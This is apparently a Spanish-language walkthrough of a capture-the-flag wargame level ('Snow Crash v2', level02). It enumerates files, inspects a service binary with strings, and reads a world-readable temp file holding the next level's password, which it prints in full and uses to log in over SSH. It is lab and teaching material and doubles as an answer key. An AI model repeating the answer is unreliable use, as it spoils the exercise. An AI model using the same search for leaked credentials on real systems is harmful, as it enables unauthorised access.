# Level02 - Snow Crash v2

## Tipo de ejercicio

Fuga de credenciales mediante un archivo temporal persistente y legible que
deja un servicio después de procesar una entrega.

## Objetivo

Encontrar la credencial que permite conectarse al usuario `level03`.

La guía clásica de Snow Crash indica que este nivel utiliza un archivo
`level02.pcap` para recuperar una contraseña escrita en una captura de red.
Sin embargo, esta OVA v2 utiliza un mecanismo diferente.

## 1. Inspeccionar el nivel

Desde la sesión SSH de `level02`:

```bash
whoami
hostname
pwd
ls -la
cat README
```

El README contiene la pista:

```text
A Kourier never loses a package. Even after delivery.
```

El directorio personal no contiene ningún archivo `level02.pcap`, por lo que
la solución clásica basada en Wireshark o TShark no aplica a esta imagen.

## 2. Buscar archivos relacionados

Se buscaron archivos cuyo nombre estuviera relacionado con Kourier, paquetes o
entregas:

```bash
find /tmp /var/tmp /var/spool /opt/snowcrash -xdev \
	\( -iname '*kourier*' -o -iname '*package*' -o -iname '*delivery*' \) \
	-ls 2>/dev/null
```

El resultado reveló un archivo temporal legible:

```text
/tmp/kourier_delivery.tmp
```

Sus permisos y propietario eran:

```text
-rw-r--r-- 1 flag02 flag02 27 ... /tmp/kourier_delivery.tmp
```

El nombre coincide con la pista del README: Kourier conserva información de
la entrega incluso después de haberla completado.

## 3. Inspeccionar el binario Kourier

También se localizó el ejecutable del nivel:

```bash
ls -la /opt/snowcrash/level02
ls -l /opt/snowcrash/level02/kourier
file /opt/snowcrash/level02/kourier
ps aux | grep '[k]ourier'
```

Resultados relevantes:

```text
/opt/snowcrash/level02/kourier: ELF 64-bit LSB pie executable, x86-64
flag02 ... /opt/snowcrash/level02/kourier
```

El binario se ejecuta como `flag02` y está relacionado directamente con el
archivo temporal encontrado. Sus cadenas visibles también muestran las rutas
de trabajo del servicio:

```bash
strings -a /opt/snowcrash/level02/kourier
```

Entre ellas aparecen:

```text
/tmp/kourier_delivery.tmp
/etc/kourier/routing.conf
/var/run/kourier_manifest.db
```

Los dos últimos archivos no aportaron información legible para `level02`:

```bash
cat /etc/kourier/routing.conf 2>/dev/null
cat /var/run/kourier_manifest.db 2>/dev/null
```

## 4. Leer el paquete entregado

La pista indicaba que el paquete no desaparecía después de la entrega. Al leer
el archivo temporal:

```bash
cat /tmp/kourier_delivery.tmp
```

se obtuvo:

```text
qi0mauch9ahksha8b6dfe3p0kq
```

Este valor es la credencial del siguiente nivel.

## 5. Conectarse a level03

Desde el equipo anfitrión, cerrar la sesión de `level02` y ejecutar:

```bash
ssh level03@localhost -p 2424
```

Cuando SSH solicite la contraseña, introducir:

```text
qi0mauch9ahksha8b6dfe3p0kq
```

La conexión correcta muestra un prompt similar a:

```text
level03@snowcrash:~$
```

## Conclusión

La solución clásica de `level02` analiza un archivo PCAP y reconstruye una
contraseña a partir de los caracteres enviados por la red. Esa captura no
existe en esta OVA v2.

En esta versión, la pista de Kourier conduce al proceso
`/opt/snowcrash/level02/kourier` y al archivo temporal
`/tmp/kourier_delivery.tmp`. El archivo permanece después de la entrega y es
legible, por lo que contiene directamente la credencial de `level03`:

```text
qi0mauch9ahksha8b6dfe3p0kq
```
